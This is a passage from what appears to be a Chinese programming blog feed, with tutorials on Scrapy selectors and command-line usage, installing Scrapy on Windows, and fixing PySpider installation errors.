class="hljs-string">&#x27;//div[@id=&quot;images&quot;]&#x27;</span>).css(<span class="hljs-string">&#x27;img::attr(aaa)&#x27;</span>).extract_first(default=<span class="hljs-string">&#x27;&#x27;</span>)</span><br>&#x27;&#x27;<br><br><span class="hljs-meta">#</span><span class="bash"> 获取所有a标签的链接</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>)</span><br>[&lt;Selector xpath=&#x27;//a/@href&#x27; data=&#x27;image1.html&#x27;&gt;, <br>&lt;Selector xpath=&#x27;//a/@href&#x27; data=&#x27;image2.html&#x27;&gt;, <br>&lt;Selector xpath=&#x27;//a/@href&#x27; data=&#x27;image3.html&#x27;&gt;, <br>&lt;Selector xpath=&#x27;//a/@href&#x27;data=&#x27;image4.html&#x27;&gt;, <br>&lt;Selector xpath=&#x27;//a/@href&#x27; data=&#x27;image5.html&#x27;&gt;]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a::attr(href)&#x27;</span>).extract()</span><br>[&#x27;image1.html&#x27;, <br>&#x27;image2.html&#x27;, <br>&#x27;image3.html&#x27;, <br>&#x27;image4.html&#x27;, <br>&#x27;image5.html&#x27;]<br></code></pre></td></tr></table></figure><p>xpath和css选择器返回的结果都差不多，所以说这个看自己的爱好，用哪一个选择器都可以，下面来说说怎么获取文本内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> xpath获取本文内容（用/text()进行获取）</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//a/text()&#x27;</span>).extract()</span><br>[&#x27;Name: My image 1 &#x27;,<br>&#x27;Name: My image 2 &#x27;, <br>&#x27;Name: My image 3 &#x27;, <br>&#x27;Name: My image 4 &#x27;, <br>&#x27;Name: My image 5 &#x27;]<br><span class="hljs-meta">#</span><span class="bash"> css获取文本内容（用::text进行获取)</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a::text&#x27;</span>).extract()</span><br>[&#x27;Name: My image 1 &#x27;, <br>&#x27;Name: My image 2 &#x27;, <br>&#x27;Name: My image 3 &#x27;, <br>&#x27;Name: My image 4 &#x27;, <br>&#x27;Name: My image 5 &#x27;]<br></code></pre></td></tr></table></figure></li><li><p>其他的selector用法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查找属性名称包含某值的所有标签（contains）</span><br><span class="hljs-meta">#</span><span class="bash"> xpath写法  //标签名[contains(@属性名,<span class="hljs-string">&quot;包含值&quot;</span>)]</span><br><span class="hljs-meta">#</span><span class="bash">   例如：查找href中包含image的所有a标签</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//a[contains(@href,&quot;image&quot;)]&#x27;</span>).extract()</span><br>[&#x27;&lt;a href=&quot;image1.html&quot;&gt;Name: My image 1 &lt;br&gt;&lt;img src=&quot;image1_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;, <br>&#x27;&lt;a href=&quot;image2.html&quot;&gt;Name: My image 2 &lt;br&gt;&lt;img src=&quot;image2_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;, <br>&#x27;&lt;a href=&quot;image3.html&quot;&gt;Name: My image 3 &lt;br&gt;&lt;img src=&quot;image3_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;, <br>&#x27;&lt;a href=&quot;image4.html&quot;&gt;Name: My image 4 &lt;br&gt;&lt;img src=&quot;image4_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;, <br>&#x27;&lt;a href=&quot;image5.html&quot;&gt;Name: My image 5 &lt;br&gt;&lt;img src=&quot;image5_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;]<br><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//a[contains(@href,&quot;image&quot;)]/@href&#x27;</span>).extract()</span><br>[&#x27;image1.html&#x27;, &#x27;image2.html&#x27;, &#x27;image3.html&#x27;, &#x27;image4.html&#x27;, &#x27;image5.html&#x27;]<br><br><span class="hljs-meta">#</span><span class="bash"> css写法  标签名[href*=image]</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a[href*=image]&#x27;</span>).extract()</span><br>[&#x27;&lt;a href=&quot;image1.html&quot;&gt;Name: My image 1 &lt;br&gt;&lt;img src=&quot;image1_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;, <br>&#x27;&lt;a href=&quot;image2.html&quot;&gt;Name: My image 2 &lt;br&gt;&lt;img src=&quot;image2_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;, <br>&#x27;&lt;a href=&quot;image3.html&quot;&gt;Name: My image 3 &lt;br&gt;&lt;img src=&quot;image3_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;, <br>&#x27;&lt;a href=&quot;image4.html&quot;&gt;Name: My image 4 &lt;br&gt;&lt;img src=&quot;image4_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;, <br>&#x27;&lt;a href=&quot;image5.html&quot;&gt;Name: My image 5 &lt;br&gt;&lt;img src=&quot;image5_thumb.jpg&quot;&gt;&lt;/a&gt;&#x27;]<br><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a[href*=image]::attr(href)&#x27;</span>).extract()</span><br>[&#x27;image1.html&#x27;, &#x27;image2.html&#x27;, &#x27;image3.html&#x27;, &#x27;image4.html&#x27;, &#x27;image5.html&#x27;]<br><br><span class="hljs-meta">#</span><span class="bash"> 其他</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//a[contains(@href,&quot;image&quot;)]/img/@src&#x27;</span>).extract()</span><br>[&#x27;image1_thumb.jpg&#x27;,&#x27;image2_thumb.jpg&#x27;,&#x27;image3_thumb.jpg&#x27;,&#x27;image4_thumb.jpg&#x27;,&#x27;image5_thumb.jpg&#x27;]<br><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a[href*=image] img::attr(src)&#x27;</span>).extract()</span><br>[&#x27;image1_thumb.jpg&#x27;,&#x27;image2_thumb.jpg&#x27;,&#x27;image3_thumb.jpg&#x27;,&#x27;image4_thumb.jpg&#x27;,&#x27;image5_thumb.jpg&#x27;]<br></code></pre></td></tr></table></figure></li><li><p>selector正则表达式匹配</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> .re(<span class="hljs-string">&quot;&quot;</span>)  .re_first(<span class="hljs-string">&quot;&quot;</span>)</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a::text&#x27;</span>).extract()</span><br>[&#x27;Name: My image 1 &#x27;, &#x27;Name: My image 2 &#x27;, &#x27;Name: My image 3 &#x27;, &#x27;Name: Myimage4 &#x27;, &#x27;Name: My image 5 &#x27;]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a::text&#x27;</span>).re(<span class="hljs-string">&#x27;Name\:(.*)&#x27;</span>)</span><br>[&#x27; My image 1 &#x27;, &#x27; My image 2 &#x27;, &#x27; My image 3 &#x27;, &#x27; My image 4 &#x27;, &#x27; My image 5&#x27;]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a::text&#x27;</span>).re_first(<span class="hljs-string">&#x27;Name\:(.*)&#x27;</span>)</span><br>&#x27; My image 1 &#x27;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;a::text&#x27;</span>).re_first(<span class="hljs-string">&#x27;Name\:(.*)&#x27;</span>).strip()</span><br>&#x27;My image 1&#x27;<br></code></pre></td></tr></table></figure></li><li><p>需要了解的语法</p><ul><li><a href="https://www.w3school.com.cn/cssref/css_selectors.ASP">css选择语法</a></li><li>xpath语法<ul><li><a href="https://blog.csdn.net/manongpengzai/article/details/77109600">https://blog.csdn.net/manongpengzai/article/details/77109600</a></li><li><a href="https://blog.csdn.net/qq_27283619/article/details/88704479">https://blog.csdn.net/qq_27283619/article/details/88704479</a></li><li><a href="https://www.w3school.com.cn/xpath/xpath_syntax.asp">https://www.w3school.com.cn/xpath/xpath_syntax.asp</a></li></ul></li><li><a href="https://www.runoob.com/regexp/regexp-syntax.html">re语法</a></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>scrapy框架的命令行解释</title>
    <link href="/2021/01/64.html"/>
    <url>/2021/01/64.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Scrapy 是通过 scrapy 命令行工具进行控制的。 这里我们称之为 “Scrapy tool” 以用来和子命令进行区分。对于子命令，我们称为 “command” 或者 “Scrapy commands”。Scrapy tool 针对不同的目的提供了多个命令，每个命令支持不同的参数和选项。</p></blockquote><a id="more"></a><h1 id="创建爬虫项目"><a href="#创建爬虫项目" class="headerlink" title="创建爬虫项目"></a>创建爬虫项目</h1><ul><li><p><code>scrapy startproject 项目名</code></p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">(venv) D:\python\爬虫学习\scrapy_spider&gt;scrapy startproject testproject<br>New Scrapy project &#x27;testproject&#x27;, using template directory &#x27;d:\python\venv\lib\site-pack<br>ages\scrapy\templates\project&#x27;, created in:<br>    D:\python\爬虫学习\scrapy_spider\testproject<br>You can start your first spider with:<br>    cd testproject<br>    scrapy genspider example example.com<br><br></code></pre></td></tr></table></figure><p>这个时候爬虫的目录结构就已经创建完成了,目录结构如下：</p></blockquote><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">(venv) D:\python\爬虫学习\scrapy_spider\testproject&gt;tree /f<br>卷 DATADRIVE1 的文件夹 PATH 列表<br>卷序列号为 4A47-5EA3<br>D:.<br>│  scrapy.cfg<br>│<br>└─testproject<br>    │  items.py<br>    │  middlewares.py<br>    │  pipelines.py<br>    │  settings.py<br>    │  __init__.py<br>    │<br>    └─spiders<br>            __init__.py<br></code></pre></td></tr></table></figure><p>接着我们按照提示可以生成一个spider,这里以百度作为例子,生成spider的命令格式为;</p></blockquote></li><li><p><code>scrapy genspider 爬虫名字 爬虫的网址</code></p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">(venv) D:\python\爬虫学习\scrapy_spider\testproject&gt;scrapy genspider baidu.com www.baidu<br>.com<br>Created spider &#x27;baidu.com&#x27; using template &#x27;basic&#x27; in module:<br>  testproject.spiders.baidu_com<br><br></code></pre></td></tr></table></figure></blockquote></li><li><p><code>scrapy crawl 爬虫名字</code>      开始运行爬虫</p></li></ul><h1 id="关于命令详细使用"><a href="#关于命令详细使用" class="headerlink" title="关于命令详细使用"></a>关于命令详细使用</h1><p>这里的命令分为全局的命令和项目的命令，全局的命令表示可以在任何地方使用，而项目的命令只能在项目目录下使用</p><ul><li><p>全局命令</p><ul><li><p>startproject</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 创建项目</span><br>scrapy startprojects 项目名<br></code></pre></td></tr></table></figure></li><li><p>genspider</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 列出所有的模版</span><br>scrapy genspider -l<br><span class="hljs-meta">#</span><span class="bash"> 运行结果</span><br>(venv) D:\python\爬虫学习\scrapy_spider\testproject&gt;scrapy genspider -l<br>Available templates:<br>  basic<br>  crawl<br>  csvfeed<br>  xmlfeed<br><br><span class="hljs-meta">#</span><span class="bash"> 当我们创建的时候可以指定模板，不指定默认用的basic,如果想要指定模板则通过</span><br>scrapy genspider -t 模板名<br><span class="hljs-meta">#</span><span class="bash"> 生成一个项目crawl模版</span><br>scrapy genspider -t crawl zhihu wwww.zhihu.com<br></code></pre></td></tr></table></figure></li><li><p>settings</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 获取帮助信息</span><br>scrapy settings -h <br><span class="hljs-meta">#</span><span class="bash"> 获取settings.py中的配置</span><br>scrapy settings --get 配置名<br><span class="hljs-meta">#</span><span class="bash"> 例子获取settings.py中的MONGO_URL</span><br>(venv) D:\python\爬虫学习\scrapy_spider\quotetutorial&gt;scrapy settings --get MONGO_URL<br>localhost<br></code></pre></td></tr></table></figure></li><li><p>runspider</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 运行爬虫</span><br>scrapy runspider 爬虫名<br></code></pre></td></tr></table></figure></li><li><p>shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 进入交互模式</span><br>scrapy shell 爬虫网址<br><span class="hljs-meta">#</span><span class="bash"> 例子</span><br>(venv) D:\python\爬虫学习\scrapy_spider\testproject&gt;scrapy shell http://baidu.com<br><br><span class="hljs-meta">&gt;</span><span class="bash"> (referer: None)</span><br>[s] Available Scrapy objects:<br>[s]   scrapy     scrapy module (contains scrapy.Request, scrapy.Selector, etc)<br>[s]   crawler    &lt;scrapy.crawler.Crawler object at 0x000001D3C1D5E1F0&gt;<br>[s]   item       &#123;&#125;<br>[s]   request    &lt;GET http://baidu.com&gt;<br>[s]   response   &lt;200 http://www.baidu.com/&gt;<br>[s]   settings   &lt;scrapy.settings.Settings object at 0x000001D3C1D5E100&gt;<br>[s]   spider     &lt;DefaultSpider &#x27;default&#x27; at 0x1d3c2218e80&gt;<br>[s] Useful shortcuts:<br>[s]   fetch(url[, redirect=True]) Fetch URL and update local objects (by default, redire<br>cts are followed)<br>[s]   fetch(req)                  Fetch a scrapy.Request and update local objects<br>[s]   shelp()           Shell help (print this help)<br>[s]   view(response)    View response in a browser<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; scrapy</span><br>&lt;module &#x27;scrapy&#x27; from &#x27;d:\\python\\venv\\lib\\site-packages\\scrapy\\__init__.py&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; <span class="hljs-built_in">exit</span>()</span><br></code></pre></td></tr></table></figure></li><li><p>fetch</p><blockquote><p>使用 Scrapy 下载器(downloader)下载给定的 URL，并将获取到的内容送到标准输出。<br>该命令以 spider 下载页面的方式获取页面。例如，如果 spider 有 USER_AGENT 属性修改了 User Agent，该命令将会使用该属性。<br>因此，您可以使用该命令来查看 spider 如何获取某个特定页面。<br>该命令如果非项目中运行则会使用默认 Scrapy downloader 设定。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 输出日志及网页源代码</span><br>scrapy fetch 爬虫网址<br><span class="hljs-meta">#</span><span class="bash"> 不显示运行日志</span><br>scrapy fetch --nolog 爬虫网址<br><span class="hljs-meta">#</span><span class="bash"> 打印响应头信息</span><br>scrapy fetch --headers 爬虫网址<br><span class="hljs-meta">#</span><span class="bash"> 不做跳转</span><br>scrapy fetch --no-redirect 爬虫网址<br></code></pre></td></tr></table></figure></li><li><p>view</p><blockquote><p>在浏览器中打开给定的 URL，并以 Scrapy spider 获取到的形式展现。 有些时候 spider 获取到的页面和普通用户看到的并不相同。 因此该命令可以用来检查 spider 所获取到的页面，并确认这是您所期望的。</p></blockquote> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta"> #</span><span class="bash"> view 从浏览器中打开网页</span><br>scrapy view http://www.taobao.com<br></code></pre></td></tr></table></figure><p>因为现在很多网站的数据都是通过ajax请求来加载的，这个时候直接通过requests请求是无法获取我们想要的数据，所以这个view命令可以帮助我们很好的判断</p></li><li><p>version</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 查看版本信息，并查看依赖库的信息</span><br><span class="hljs-string">scrapy</span> <span class="hljs-string">version</span><br><span class="hljs-string">scrapy</span> <span class="hljs-string">version</span> <span class="hljs-string">-v</span><br><br><span class="hljs-comment"># 运行结果</span><br><span class="hljs-string">(venv)</span> <span class="hljs-string">D:\python\爬虫学习\scrapy_spider\quotetutorial\quotetutorial&gt;scrapy</span> <span class="hljs-string">version</span><br><span class="hljs-string">Scrapy</span> <span class="hljs-number">2.4</span><span class="hljs-number">.1</span><br><br><span class="hljs-string">(venv)</span> <span class="hljs-string">D:\python\爬虫学习\scrapy_spider\quotetutorial\quotetutorial&gt;scrapy</span> <span class="hljs-string">version</span> <span class="hljs-string">-v</span><br><span class="hljs-attr">Scrapy       :</span> <span class="hljs-number">2.4</span><span class="hljs-number">.1</span><br><span class="hljs-attr">lxml         :</span> <span class="hljs-number">4.5</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><span class="hljs-attr">libxml2      :</span> <span class="hljs-number">2.9</span><span class="hljs-number">.5</span><br><span class="hljs-attr">cssselect    :</span> <span class="hljs-number">1.1</span><span class="hljs-number">.0</span><br><span class="hljs-attr">parsel       :</span> <span class="hljs-number">1.6</span><span class="hljs-number">.0</span><br><span class="hljs-attr">w3lib        :</span> <span class="hljs-number">1.22</span><span class="hljs-number">.0</span><br><span class="hljs-attr">Twisted      :</span> <span class="hljs-number">20.3</span><span class="hljs-number">.0</span><br><span class="hljs-attr">Python       :</span> <span class="hljs-number">3.8</span><span class="hljs-number">.6</span> <span class="hljs-string">(tags/v3.8.6:db45529,</span> <span class="hljs-string">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">2020</span><span class="hljs-string">,</span> <span class="hljs-number">15</span><span class="hljs-string">:52:53)</span> [<span class="hljs-string">MSC</span> <span class="hljs-string">v.1927</span> <span class="hljs-number">64</span> <span class="hljs-string">bit</span> <span class="hljs-string">(AM</span><br><span class="hljs-string">D64)</span>]<br><span class="hljs-attr">pyOpenSSL    :</span> <span class="hljs-number">20.0</span><span class="hljs-number">.1</span> <span class="hljs-string">(OpenSSL</span> <span class="hljs-number">1.1</span><span class="hljs-string">.1i</span>  <span class="hljs-number">8</span> <span class="hljs-string">Dec</span> <span class="hljs-number">2020</span><span class="hljs-string">)</span><br><span class="hljs-attr">cryptography :</span> <span class="hljs-number">3.3</span><span class="hljs-number">.1</span><br><span class="hljs-attr">Platform     :</span> <span class="hljs-string">Windows-10-10.0.17763-SP0</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>项目命令</p><ul><li><p>crawl</p><blockquote><p>这个是用去启动spider爬虫格式为：<br><code>scrapy crawl 爬虫名字</code><br>这里需要注意这里的爬虫名字和通过scrapy genspider 生成爬虫的名字是一致的</p></blockquote></li><li><p>check</p><blockquote><p>用于检查代码是否有错误</p><p><code>scrapy check</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">(venv) D:\python\爬虫学习\scrapy_spider\testproject&gt;scrapy check<br><br>----------------------------------------------------------------------<br>Ran 0 contracts in 0.001s<br><br>OK<br></code></pre></td></tr></table></figure></blockquote></li><li><p>list</p><blockquote><p>列出所有可用的爬虫</p><p><code>scrapy list</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">(venv) D:\python\爬虫学习\scrapy_spider\testproject&gt;scrapy list<br>baidu.com<br>zhihu<br><br></code></pre></td></tr></table></figure></blockquote></li><li><p>edit</p><blockquote><p>edit 在命令行下编辑spider ### 不建议运行<br><code>scrapy edit 爬虫名</code></p></blockquote></li><li><p>parse</p><blockquote><p>获取给定的 URL 并使用相应的 spider 分析处理。如果您提供<code>--callback</code> 选项，则使用 spider 的该方法处理，否则使用 <code>parse</code>。</p><p><code>scrapy parse 爬虫网址 [options]</code></p><p>支持的选项：</p><ul><li><code>--spider=SPIDER</code>：跳过自动检测 spider 并强制使用特定的 spider</li><li><code>--a NAME=VALUE</code>：设置 spider 的参数(可能被重复)</li><li><code>--callback or -c</code>：spider 中用于解析返回(response)的回调函数</li><li><code>--pipelines</code>：在 pipeline 中处理 item</li><li><code>--rules or -r</code>：使用 CrawlSpider 规则来发现用来解析返回(response)的回调函数</li><li><code>--noitems</code>：不显示爬取到的 item</li><li><code>--nolinks</code>：不显示提取到的链接</li><li><code>--nocolour</code>：避免使用 pygments 对输出着色</li><li><code>--depth or -d</code>：指定跟进链接请求的层次数(默认：1)</li><li><code>--verbose or -v</code>：显示每个请求的详细信息</li></ul></blockquote></li><li><p>bench</p><blockquote><p>运行 benchmark 测试。Benchmarking。</p><p><code>scrapy bench</code></p></blockquote></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows环境下安装Scrapy的正确方式</title>
    <link href="/2021/01/63.html"/>
    <url>/2021/01/63.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Scrapy是一个为了爬取网站数据提取结构性数据而编写的应用框架，可以应用于数据挖掘，信息处理或存储历史数据等一些列的程序中。<br>Scrapy最初就是为了网络爬取而设计的。现在，Scrapy已经推出了曾承诺过的Python3.x版本。<br>为什么学习Scrapy呢？它能我们更好的完成爬虫任务，自己写Python爬虫程序好比孤军奋战，而使用了Scrapy就好比手底下有了千军万马。<br>Scrapy可以起到事半功倍的效果。所以，学习Scrapy也就显得很有必要了。</p></blockquote><a id="more"></a><p>友情提醒：一定要按照Python的版本下载，要不然安装的时候会提醒找不到Python。建议大家安装32位是因为有些版本的必备软件64位不好找。</p><ul><li><p>安装Python（建议32位）</p><blockquote><p>安装完了记得配置环境，将python目录和python目录下的Scripts目录添加到系统环境变量的Path里。</p></blockquote></li><li><p>lxml（这个最重要），使用pip命令安装</p><blockquote><p><code>pip3 install lxml</code><br>若没有报错，则安装成功，如果报错提示缺少libxml2 库，可以使用wheel文件进行安装 libxml2</p></blockquote></li><li><p>pyOpenSSL</p><blockquote><p>需要在官网下载wheel文件 <a href="https://pypi.org/project/pyOpenSSL/#files">pyOpenssL</a><br>下载后使用<code>pip3 install 文件路径/下载文件名.whl</code>（例：‪pip3 install D:\QQDownload\pyOpenSSL-17.2.0-py2.py3-none-any.whl）<br>也可以尝试用<code>pip3 install pyopenssl</code>进行安装</p></blockquote></li><li><p>Twisted</p><blockquote><p>同理，需要在官网下载wheel文件 <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted">Twisted</a><br>不过一定要记得在控制台下输入<code>python</code>查看你的电脑版本和python版本，然后在上面的地址中下载对应的wheel文件<br>下载完后使用<code>pip3 install 文件路径/下载文件名.whl</code><br>也可以尝试<code>pip3 install twisted</code></p></blockquote></li><li><p>PyWin32</p><blockquote><p>在官网下载对应版本的安装包双击安装即可 <a href="https://sourceforge.net/projects/pywin32/files/">pywin32</a><br>或者<code>pip3 install pywin32</code></p></blockquote></li><li><p>Scrapy</p><blockquote><p>在依赖包全部安装成功前提下安装Scrapy框架，使用pip命令<br><code>pip3 install scrapy</code></p></blockquote></li></ul><hr><p><strong>如果提示缺少C++库，可以使用<a href="https://gocos.lanzoui.com/iM8Mel0yiad">Microsoft Visual C++ Build Tools.exe</a>来解决。</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PySpider安装遇到的坑及解决办法</title>
    <link href="/2021/01/62.html"/>
    <url>/2021/01/62.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>这段时间在学爬虫，安装pyspider框架，遇到了很多坑，像关键字问题等等，本机已经安装好pycharm(python3.9)，现做测试，需要在开发机上安装pyspider，基于windows下的安装遇到一些坑，记录一下。</p></blockquote><h1 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h1><ul><li><p><code>pip3 install pyspider</code></p></li><li><p>这个过程应该能没什么问题，pyspider是对pip有版本要求的，所以最好自动升级一下</p><h1 id="填坑"><a href="#填坑" class="headerlink" title="填坑"></a>填坑</h1></li></ul><p>ok ,安装完成我们开始填坑。</p><ul><li>执行 pyspider all，立马报错：<br><img src="https://p.pstatp.com/origin/138640001b5887ab45483" srcset="/img/loading.gif" lazyload></li></ul><p><strong>报错信息：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">  File <span class="hljs-string">&quot;d:\python\venv\lib\site-packages\pyspider\run.py&quot;</span>, line 231<br>    <span class="hljs-attribute">async</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">get_object</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">no_input</span>=<span class="hljs-literal">False</span>):<br>    ^<br>SyntaxError: invalid syntax<br><br></code></pre></td></tr></table></figure><p>这是因为python3.5开始把<code>async</code>和<code>await</code>设为关键字了，这里作为参数名与关键字冲突了，因此找到对应的py文件，将<code>async</code>修改为其他名称，我修改为<code>pyspiderasync</code>。在以下几个文件中存在：<code>pyspider-&gt;run.py</code>、<code>pyspider-&gt;fetcher-&gt;tornado_fetcher.py</code>、<code>webui&gt;app.py</code>。</p><ul><li>再次执行 pyspider all, 报错：<br><img src="https://p.pstatp.com/origin/1384900026e094d9a65ea" 